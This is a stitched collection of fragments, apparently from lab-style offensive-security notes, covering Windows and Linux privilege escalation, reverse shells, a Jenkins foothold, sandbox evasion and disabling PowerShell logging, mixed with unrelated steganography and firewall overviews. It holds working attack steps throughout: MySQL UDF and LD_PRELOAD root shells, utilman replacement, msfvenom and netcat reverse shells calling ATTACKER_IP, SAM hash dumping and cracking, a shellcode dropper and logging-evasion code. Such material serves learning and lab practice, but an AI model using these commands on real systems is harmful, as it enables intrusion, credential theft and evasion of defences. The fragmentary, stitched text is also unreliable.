    "c": "Harvesting passwords  Escalate using found credentials in Unattended Windows installations Powershell history Saved Windows credentials IIS configuration Retrieve credentials from software, for example PuTTY Examples  Unattended Windows installations  When installing Windows on a large number of hosts, administrators often use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These unattended installations do not require user interaction. They do require the use of an administrator account for the initial setup, which might end up being stored in the machine in the following locations: C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml Powershell history  Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved. In the cmd.exe prompt: type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt In the Powershell prompt: type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Saved Windows credentials  Windows allows for the use of other users’ credentials. To list saved credentials: cmdkey /list Passwords are not given, but a possibly interesting credential can be used with the runas command and the /savecred option: runas /savecred /user:admin cmd.exe IIS configuration  Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in the web.config file and can store passwords for databases or configured authentication mechanisms. Depending on the version of IIS, it can be found in: C:\\inetpub\\wwwroot\\web.config C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config To find database connection strings on the file: type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString Retrieve credentials from PuTTY  To retrieve the stored proxy credentials, search under the following registry key for ProxyPassword with: reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s Simon Tatham is the creator of PuTTY (and his name is part of the path), and is not the username. Keep command as is. Notes  The example for retrieving credentials from software here is PuTTY. but any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.",

System administrators sometimes give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap but would not be cleared for full root access. The system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system. Any user can check its current situation related to root privileges using the sudo -l command. Use GTFObins for gathering information on how any program, on which a user may have sudo rights, can be used.",

We can use a that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service. Change into the /home/user/tools/mysql-udf directory: cd /home/user/tools/mysql-udf Compile the raptor_udf2.c exploit code: gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc Connect to the MySQL service as the root user with a blank password: mysql -u root Execute the following commands on the MySQL shell to create a User Defined Function (UDF) do_system using the compiled exploit: use mysql; create table foo(line blob); insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so'; create function do_system returns integer soname 'raptor_udf2.so'; Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission: select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); Exit out of the MySQL shell (type exit or \\q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges: /tmp/rootbash -p Remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later. rm /tmp/rootbash exit Weak file permissions - Readable /etc/shadow  The /etc/shadow file contains user password hashes and is usually readable only by the root user. The /etc/shadow file on the lab VM is world-readable. Check with: ls -l /etc/shadow To view the contents of the /etc/shadow file: cat /etc/shadow Each line of the file represents a user. A user’s password hash (if they have one) can be found between the first and second colons ( : ) of each line. Save the root user’s hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Switch to the root user, using the cracked password: su root Exit out of the root shell before continuing! Questions  What is the root user’s password hash? Answer: $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0 What hashing algorithm was used to produce the root user’s password hash? Answer: sha512crypt What is the root user’s password? Answer: password123 Weak file permissions - Writable /etc/shadow  The /etc/shadow file contains user password hashes and is usually readable only by the root user. The /etc/shadow file on the VM is world-writable. Check with: ls -l /etc/shadow Generate a new password hash with a password of your choice: mkpasswd -m sha-512 newpasswordhere Edit the /etc/shadow file and replace the original root user’s password hash with the one just generated. Switch to the root user, using the new password: su root Exit out of the root shell before continuing! Weak file permissions - Writable /etc/passwd  The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there. The /etc/passwd file is world-writable. Check with: ls -l /etc/passwd Generate a new password hash with a password of your choice: openssl passwd newpasswordhere Edit the /etc/passwd file and place the generated password hash between the first and second colon ( : ) of the root user’s row (replacing the “x”). Switch to the root user, using the new password: su root Alternatively, copy the root user’s row and append it to the bottom of the file, changing the first instance of the word root to newroot and placing the generated password hash between the first and second colon (replacing the “x”). Now switch to the newroot user, using the new password: su newroot Exit out of the root shell before continuing! Questions  Run the “id” command as the newroot user. What is the result? Answer: uid=0(root) gid=0(root) groups=0(root) Shell escape sequences  List the programs which sudo allows your user to run: sudo -l Visit GTFOBins and search for the program names. If the program is listed with sudo as a function, it can be used to elevate privileges, usually via an escape sequence. Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins. For an extra challenge, try to gain a root shell using all the programs on the list! Exit out of the root shell before continuing! Questions  How many programs is user allowed to run via sudo? Answer: 11 One program on the list doesn’t have a shell escape sequence on GTFOBins. Which is it? Answer: apache2 Consider how you might use this program with sudo to gain root privileges without a shell escape sequence. Sudo - Environment variables  sudo can be configured to inherit certain environment variables from the user’s environment. Check which environment variables are inherited (look for the env_keep options): sudo -l LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user’s environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first. Create a shared object using the code located at /home/user/tools/sudo/preload.c : gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c Run one of the programs you are allowed to run via sudo (listed when running sudo -l ), while setting the LD_PRELOAD environment variable to the full path of the new shared object: sudo LD_PRELOAD=/tmp/preload.so program-name-here A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well. Run ldd against the apache2 program file to see which shared libraries are used by the program: ldd /usr/sbin/apache2 Create a shared object with the same name as one of the listed libraries ( libcrypt.so.1 ) using the code located at /home/user/tools/sudo/library_path.c : gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c Run apache2 using sudo , while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object): sudo LD_LIBRARY_PATH=/tmp apache2 A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work. Exit out of the root shell before continuing! Cron jobs - File permissions  Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab . View the contents of the system-wide crontab: cat /etc/crontab There should be two cron jobs scheduled to run every minute. One runs overwrite.sh , the other runs /usr/local/bin/compress.sh . Locate the full path of the overwrite.sh file: locate overwrite.sh Note that the file is world-writable: ls -l /usr/local/bin/overwrite.sh Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box. #!/bin/bash bash...",

LocalSystem is just the highest privileged account available. To trigger the payload, restart the service: C:\\> sc stop NamedService C:\\> sc start NamedService Notes  Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services. Use the sc qc someservice command for more info on a service. The associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter. Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. All services configurations are stored in the registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\\ A subkey exists for every service in the system. If a DACL has been configured for the service, it will be stored in a subkey called Security . Only administrators can modify such registry entries by default. Insecure Permissions on Service Executable  If an executable associated with a service has weak permissions that allow an adversary to modify or replace it, the adversary can gain the privileges of the service’s account. Unquoted path vulnerability  When we can’t directly write into service executables, there might still be a chance. Most of the service executables will be installed under C:\\Program Files or C:\\Program Files (x86) by default, which isn’t writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule. Some installers change the permissions on the installed folders, making the services vulnerable. An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, an “Unquoted Service Paths vulnerability” (if found) can be exploited. For example, the Administrator installed the Disk Sorter binaries under c:\\MyPrograms . By default, this inherits the permissions of the C:\\ directory, which allows any user to create files and folders in it. Check with icacls in the Command Prompt: C:\\>icacls c:\\MyPrograms c:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(AD) BUILTIN\\Users:(I)(CI)(WD) CREATOR OWNER:(I)(OI)(CI)(IO)(F) The BUILTIN\\\\Users group has AD and WD privileges, allowing a user to create subdirectories and files. The Unquoted in “Unquoted Service Paths vulnerability” means that the path of the associated executable is not properly quoted to account for spaces on the command. Quoted: BINARY_PATH_NAME : \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" -service Unquoted: BINARY_PATH_NAME : C:\\MyPrograms\\Disk Sorter...",

    "c": "Exploiting vulnerabilities  Malware, more specifically ransomware, continues to be a significant threat. We are talking exploits. Supply chain attacks are relatively new but continue to grow in size and frequency. Cloud-based threats encompass a wide range of TTPs. And with so many businesses using the cloud, and cloud networks and the offered services becoming more intricate, their infrastructure has become “low-hanging fruit”. Social engineering: phishing, spear phishing, whaling, smishing, vishing, baiting, piggybacking/tailgating, … Insider threats. Mobile devices: many more infiltration opportunities than ever before. Each cybersecurity threat is a learning opportunity, but most organisations do not have an incident strategy and incident response team. And there may be incidents that were not noticed, and have been ungoing for a loooong time already … Social engineering  Social engineering is the use of deception to try to trick a user into compromising system security through an email message, a text message, a phone call, etc. Social engineering attacks are a common way to test the effectiveness of a company’s security education program. Application-based  Injection attacks  Injection attacks are one of the most common types of attacks against applications today. Web applications are especially vulnerable because they are internet-facing and their audience is extended out to the Internet. Authentication attacks  Authentication attacks are methods that can be used to try to bypass the authentication or compromise the security of the application by cracking the application’s passwords. Authorisation attacks  After a user authenticates to an application or API, the user is then authorised to perform different actions while using the application or API. A vulnerable application may not have authorisation configured properly and simply allows users and other applications to perform any task within the application. XSS and CSRF/XSRF attacks  Cross-site scripting, or XSS for short, is one of the most common vulnerabilities found in web applications and involves the hacker injecting client-side script into a web page that is then viewed and executed by others at a later time. The goal of a CSRF/ XSRF attack is to get an unsuspecting user to submit data to a website the user has already logged on to. A CSRF/XSRF attack leverages the fact that the site has already authenticated the user to the site, and therefore trusts all actions from the user. Network-based vulnerabilities  Exploits that are created to leverage network-based vulnerabilities are interesting exploits because the attacks are performed across the network — an adversary does not need local access to the systems. Network-based vulnerabilities can lead to compromise of the target operating system, privilege escalation, or loss or degradation of service performance. Most network-based vulnerabilities can be identified withvulnerability assessment, or by vulnerability research. The Metasploit Framework or SearchSploit can be used to validate public exploits for vulnerabilities identified during a vulnerability assessment. Common public exploits are Name-resolution exploits; Link-Local Multicast Name Resolution (LLMNR)/NetBIOS Name Service(NBT-NS) poisoning; New Technology LAN Manager (NTLM) relay attacks; SMB exploits; SNMP exploits; SMTP exploits; to name but a few. Local host vulnerabilities  Systems today are a variety of devices, and each type of device comes with its own list of vulnerabilities: Operating system vulnerabilities; Unsecure service and protocol configurations; Privilege escalation vulnerabilities; Default account settings; Sandbox escape possibilities; and Physical device security vulnerabilities.",

It is run with SYSTEM privileges, so SYSTEM privileges can be gained by replacing the original binary with any payload. Because we can take ownership of any file, replacing it is trivial. Take ownership of utilman.exe : C:\\> takeown /f C:\\Windows\\System32\\Utilman.exe SUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\". Give the user you are logged in as, full permissions over utilman.exe C:\\> icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F processed file: Utilman.exe Successfully processed 1 files; Failed processing 0 files Replace utilman.exe with a copy of cmd.exe : C:\\Windows\\System32\\> copy cmd.exe utilman.exe 1 file(s) copied. To trigger utilman, lock the screen from the start button, then click on the “Ease of Access” button, which runs utilman.exe with SYSTEM privileges. C:\\Windows\\system32> whoami nt authority\\system FTP impersonation  An FTP service running with user ftp . Without impersonation, if a user logs into the FTP server and tries to access ftp files, the FTP service would try to access them with its access token rather than Ann’s. With ftp token like this, we must manually configure specific permissions for each served file/directory. The ftp user has access to all files. If the FTP service were compromised at some point, the attacker would immediately gain access to all folders to which the ftp user has access. If instead, the FTP service’s user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf. If we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process. Plant a web shell on http://IP address target/ Use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest. Upload RogueWinRM to the target machine. The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, a port that exposes a Powershell console to be used remotely through the network. Start a netcat listener: # nc -lvp 4442 Use the web shell to trigger the RogueWinRM exploit: c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\" The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. The exploit may take up to 2 minutes to work, so the browser may appear unresponsive for a bit. c:\\windows\\system32\\inetsrv>whoami nt authority\\system Notes  Privileges are rights that an account has to perform specific system-related tasks. These tasks can be from the privilege to shut down the machine up to privileges to bypass some DACL-based access controls. SeBackup/SeRestore  The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an adversary can trivially escalate privileges on the system by using many techniques. SeTakeOwnership  The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges. For example, search for a service running as SYSTEM and take ownership of the service’s executable. SeImpersonate/SeAssignPrimaryToken  These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user. Resources  Privilege Constants (Authorization) Priv2Admin",

The Task To Run is of interest. If the current user can modify or overwrite the executable, we can control what gets executed by the taskusr1 user, giving a simple privilege escalation. Check the file permissions on the executable: C:\\> icacls c:\\tasks\\schtask.bat c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(F) In this case, the BUILTIN\\Users group has full access (F) over the task’s binary.

Transfer the file to C:\\Windows\\Temp on the target machine. Run the installer with the command below and receive the reverse shell: C:\\> msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi Notes  These belong more to the realm of CTF events rather than real world scenarios. Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it is using a modifiable binary. Windows installer files ( .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. And they can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow for generating a malicious .msi file that would run with admin privileges.",

    "c": "Common shells  Types of shells  Shells are used for interfacing with a Command Line environment (CLI) like the common bash or sh programs in Linux, and the cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target. Reverse shell  Reverse shells are when the target is forced to execute code that connects back to the attack computer. This requires setting up a listener which would be used to receive the connection on the attack machine. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target. Start a listener on attack machine Start a reverse shell on target machine Bind shell  Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be open up a port to receive on that you can connect to, and obtain remote code execution. This has the advantage of not requiring any configuration on the attack network, but may be prevented by firewalls protecting the target. Start a listener on target machine Connect to listener on target from attack machine Windows bind shells  In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries , and the version used in Kali itself) there is a -e option which allows for executing a process on connection: nc -lvnp <port-number> -e /bin/bash Connecting to the above listener with netcat would result in a bind shell on the target.

Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin ( admin/password123 ) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves! rdesktop MACHINE_IP Registry - AlwaysInstallElevated  Query the registry for AlwaysInstallElevated keys: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Note that both keys are set to 1 ( 0x1 ). On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi Transfer the reverse.msi file to the C:\\PrivEsc directory on Windows (use the SMB server method from earlier). Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges: msiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi Passwords - Registry  The registry can be searched for keys and values that contain the word “password”: reg query HKLM /f password /t REG_SZ /s If you want to save some time, query this specific key to find admin AutoLogon credentials: reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\" On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found): winexe -U 'admin%password' //MACHINE_IP cmd.exe Questions  What was the admin password found in the registry? Answer: password123 Passwords - Saved creds  List any saved credentials: cmdkey /list Note that credentials for the admin user are saved. If they aren’t, run the C:\\PrivEsc\\savecred.bat script to refresh the saved credentials. Start a listener on Kali and run the reverse.exe executable using runas with the admin user’s saved credentials: runas /savecred /user:admin C:\\PrivEsc\\reverse.exe Passwords - Security Account Manager (SAM)  The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\\Windows\\Repair\\ directory. Transfer the SAM and SYSTEM files to the Kali VM: copy C:\\Windows\\Repair\\SAM \\\\10.10.10.10\\kali\\ copy C:\\Windows\\Repair\\SYSTEM \\\\10.10.10.10\\kali\\ On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files: git clone https://github.com/Tib3rius/creddump7 pip3 install pycrypto python3 creddump7/pwdump.py SYSTEM SAM Crack the admin NTLM hash using hashcat : hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt Use the cracked password to log in as the admin using winexe or RDP.

Exploring  Browse to the IP address target machine>:80 and IP address target machine:8080 website. The first, on port 80, shows a silly image and message with nothing else to click or navigate to. The second shows a Jenkins login page. Maybe default credentials are used for Jenkin and then were not changed? Researching that, the default username is admin but the password gets automatically filled, dependent on system. And then maybe changed to something more easily memorised? Doing some password guessing manually, I found admin:admin . If that had not worked I could have tried intercepting a login request with Burpsuite and using Intruder to use a password list against the password field. But, as it is, I’m already in. Gaining a foothold  The Jenkins documentation gives me two possible ways of Remote Code Execution: Click “Project” to get into the prebuilt project, then click “Configure” on the left. Scrolling down, there is a window that allows for executing Windows batch commands. Windows batch commands window in project configuration Test with: whoami . Jenkins also comes with a “Script Console” administrative tool, which allows authenticated users to run scripts using Apache Groovy , a Java-syntax-compatible object-oriented programming language for the Java platform. On the mainpage on the left, click on “Manage Jenkins”, scroll down below the warnings, and click script console from the list. https://www.jenkins.io/doc/book/managing/script-console/ Test using print to display the output of the command: print \"whoami\".execute().text . A PowerShell command to execute a reverse shell might work in both. Nishang contains a lot of reverse shell payloads and more. If on Kali, copy Invoke-PowershellTcp.ps1 from /usr/share/nishang/Shells . If not on Kali, download Invoke-PowershellTcp.ps1 from Gihub .

Vulnerabilities are bugs which can be taken advantage of to achieve an unintended or unanticipated behaviour. A Risk (Threat) may materialise, if someone decides to take advantage of a vulnerability and exploit it. An exploit is a piece of code, a program or data which takes advantage of a vulnerability to achieve an unintended or unanticipated behaviour (materializing the risk) in the software that contains a bug. A payload is the part of transmitted data that is the actual intended message to cause the unintended or unanticipated behaviour. Why?  Remote exploits are codes with purpose to exploit a vulnerability on a remote system without having any prior access to it. Local exploits are codes with purpose to exploit a vulnerability locally on the system where we already have a foothold.

The common technique used in this field replaces the least significant bits (LSB) of image pixels with intended secret bits. Several improvements to enhance the security of the LSB method have been presented earlier. This paper proposed a new improved technique that takes the advantage of the 24 bits in each pixel in the RGB images using the two least significant bits of one channel to indicate existence of data in the other two channels. The stego method does not depend on a separate key to take out the key management overhead. !!! The flag for this challenge is : \"***Flag***\". Instead, it is using the size of the secret data as selection criteria for the first indicator channel to insert security randomness. Our proposed technique is analyzed using security and capacity measures and compared to two other similar work.

    "c": "Problems and challenges  Secret communication is used for a variety of reasons and by a variety of people: Business people protecting company trade secrets while traveling. Criminals transmitting child pornography. Governments hiding information from their own civilians and from other governments. Techno lovers sending secret messages to each other because they can for having some fun. Terrorists sending attack plans. Activists posting information to each other. Hackers extracting and exfiltrating data from a system. Phishing by nation-state adversaries. In a world more and more on alert, the methods available to anybody who wants to hide information are bound to become more sophisticated, and will be used and misused. Civil rights and privacy?  In response to the perceived threats, legislation appeared in several countries to allow governments to look at any online communication. Some countries can send you to jail if you refuse to give up your key to encrypted data. Law enforcement works together with ISPs all the time to get information about peoples’ online activities. Using steganography for keeping personal information private jumps to mind. Securing businesses  Still too many companies and organisations seem to believe that using a single technology, such as Secure Sockets Layer (SSL) for online transactions, or network software with a firewall or VPN, is sufficient. Some may protect data in rest and then forget about protecting it in transit. What is needed today to protect from information theft, and to detect encryption and hidden data used on a local network is an all-encompassing security strategy. Which seems to not be happening too much. While businesses and organisations do not share information when they are attacked, attackers share information all the time, learning from each other’s ideas and techniques, and developing new tactics. Defense in depth and mitigating and minimizing risk is needed, but staff and budget isn’t there because management does not seem to see the value (until the cost of breach hits, and even then). Coming up  Cryptography is about encrypting messages so that they can be read only by someone who has the key. Steganography hides messages so that their very existence is undetectable. Both forms of secret communication are being used, overt and covert. Like all security technology, steganography is not perfect. If someone knows it is there and knows the algorithm that was used to hide it, and if the message is not encrypted, he or she can read it. Even if the message is encrypted, in some cases just knowing that data has been hidden in a file is enough to raise suspicions.",

Next-generation firewalls are also designed to cover layers 5, 6, and 7. The more layers a firewall can inspect, the more sophisticated it gets and the more processing power it needs. Based on firewall abilities, we can list the following firewall types: Packet-Filtering Firewall  Packet-filtering is the most basic type of firewall. This type of firewall inspects the protocol, source and destination IP addresses, and source and destination ports in the case of TCP and UDP datagrams. It is a stateless inspection firewall. Circuit-Level Gateway  In addition to the features offered by the packet-filtering firewalls, circuit-level gateways can provide additional capabilities, such as checking TCP three-way-handshake against the firewall rules. Stateful Inspection Firewall  Compared to the previous types, this type of firewall gives an additional layer of protection as it keeps track of the established TCP sessions. As a result, it can detect and block any TCP packet outside an established TCP session. Proxy Firewall  A proxy firewall is also referred to as Application Firewall (AF) and Web Application Firewall (WAF). It is designed to masquerade as the original client and requests on its behalf. This process allows the proxy firewall to inspect the contents of the packet payload instead of being limited to the packet headers. Generally speaking, this is used for web applications and does not work for all protocols. Next-Generation Firewall (NGFW)  NGFW offers the highest firewall protection. It can practically monitor all network layers, from OSI Layer 2 to OSI Layer 7. It has application awareness and control. Examples include the Juniper SRX series and Cisco Firepower. Cloud Firewall or Firewall as a Service (FWaaS)  FWaaS replaces a hardware firewall in a cloud environment. Its features might be comparable to NGFW, depending on the service provider; however, it benefits from the scalability of cloud architecture. One example is Cloudflare Magic Firewall, which is a network-level firewall. Another example is Juniper vSRX; it has the same features as an NGFW but is deployed in the cloud. It is also worth mentioning AWS WAF for web application protection and AWS Shield for DDoS protection.",

    "c": "Common sandbox evasion techniques  Some practical knowledge to help out in Red Team operations (from basic techniques to the most advanced): Sleeping through sandboxes Geolocation and geoblocking Checking system information Querying network information Sleeping through sandboxes  Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may increase the Sandboxes queue drastically. This is a crucial aspect that can be abused. For example, if we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before executing shellcode. This could be done in any number of ways: One common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, the program can begin normal execution. Another popular method is to do complex, compute-heavy math, which may take a certain amount of time — for example, calculating the Fibonacci sequence up to a given number. It may take more or less time to do so based on the system’s hardware. Masking the application is generally a good idea to avoid Anti-Virus detections in general. Beware that some sandboxes may alter built-in sleep functions. Several Anti-Virus vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommended to develop our own sleep function. Geolocation and geoblocking  One defining factor of Sandboxes is that they are often located off-premise and are hosted by Anti-Virus providers. If you know you are attacking TryHackMe, a European company, and your binary is executed in California, you can make an educated guess that the binary has ended up in a Sandbox. You may choose to implement a geolocation filter on your program that checks if the IP Address block is owned by the company you are targeting or if it is from a residential address space. IfConfig.me can be used to retrieve your current IP Address, with additional information being optional. Combining this with ARIN’s RDAP allows you to determine the ISP returned in an easy to parse format (JSON). That will, ofcourse, will only work if the host has internet access. Some organizations may build a block list of specific domains, so you should be 100% sure that this method will work for the organization you are attempting to leverage this against. Checking system information.  Another incredibly popular method is to observe system information. Most Sandboxes typically have reduced resources. A popular Malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine. Most workstations in a network typically have 2-8 CPU cores, 8-32GB of RAM, and 256GB-1TB+ of drive space. This is incredibly dependent on the organisation that you are targeting, but generally, you can expect more than 2 CPU cores per system and more than 4GB of RAM. Knowing this, we can tailor our code to query for basic system info (CPU core count, RAM amount, Disk size, etc). Some additional examples of things to filter on: Storage Medium Serial Number PC Hostname BIOS/UEFI Version/Serial Number Windows Product Key/OS Version Network Adapter Information Virtualization Checks Current Signed in User … Querying network information  Almost no Malware Sandboxes are joined in a domain, so it’s relatively safe to assume if the machine is not joined to a domain, it is not the right target. You cannot always be too sure, so collect some information about the domain to be safe, for example. check: Computers User accounts Last User Login(s) Groups Domain Admins Enterprise Admins Domain Controllers Service Accounts DNS Servers These techniques can vary in difficulty. Consider how much time and effort to spend building out these evasion methods. A simple method, such as checking the systems environment variables (this can be done with echo %VARIABLE% or to display all variables, use the set command) for an item like the LogonServer , LogonUserSid , or LogonDomain may be much easier than implementing a Windows API. Setting the stage  Create a basic dropper that retrieves shellcode from a Web Server (specifically from /index.raw ) and injects it into memory, and executes the shellcode. All shellcode must be generated with MSFVenom in a raw format, and must be 64-bit, not 32-bit. $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw Prepare for download on the target machine: $ python3 -m http.server 8080 Download the dropper.cpp , and open it in Visual Studio Code or Codium . #include <iostream> #include <Windows.h> #include <tlhelp32.h> #include <locale> #include <string> #include <urlmon.h> #include <cstdio> #pragma comment(lib, \"urlmon.lib\") using namespace std; int downloadAndExecute() { HANDLE hProcess; //Update the dwSize variable with your shellcode size.

These features can be enabled by modifying the GPO (Group Policy Object) settings of their parent policy. Two of the most popular GPO providers provide coverage over PowerShell, including script block logging and module logging. Event ID Purpose 4103 Logs command invocation 4104 Logs script block execution Script block logging will log any script blocks executed within a PowerShell session. Introduced in PowerShell v4 and improved in PowerShell v5, the ETW provider has two event IDs it will report. Event ID 4104 is important because it can expose scripts if not properly obfuscated or hidden. Module logging is a very verbose provider that will log any modules and data sent from it. Introduced in PowerShell v3, each module within a PowerShell session acts as a provider and logs its own module. Similar to the previous provider, the modules will write events to event ID 4103 . Event ID 4103 is less important because of the amount of logs created. Sysadmins limit it or disable it completely. Module logging and script block logging providers are both enabled from a group policy: Administrative Templates -> Windows Components -> Windows PowerShell. Within a PowerShell session, system assemblies are loaded in the same security context as users. This means an attacker has the same privilege level as the assemblies that cache GPO settings. Using reflection, an attacker can obtain the utility dictionary and modify the group policy for either PowerShell provider. At a high-level a group policy takeover can be broken up into three steps: Obtain group policy settings from the utility cache. Modify generic provider to 0 . Modify the invocation or module definition. Code  Use reflection to obtain the type of System.Management.Automation.Utils and identify the cachedGroupPolicySettings GPO cache field: $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static') $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null) Leverage the GPO variable to modify the event provider setting to 0. EnableScriptBlockLogging will control 4104 events, limiting the visibility of script execution. Writing to the object or registry directly: $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0 Repeat the previous step with any other provider settings. EnableScriptBlockInvocationLogging will control 4103 events, limiting the visibility of cmdlet and pipeline execution: $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0 Compile these steps together and append them to a PowerShell script.",

    "t": "Static property-based signatures ",
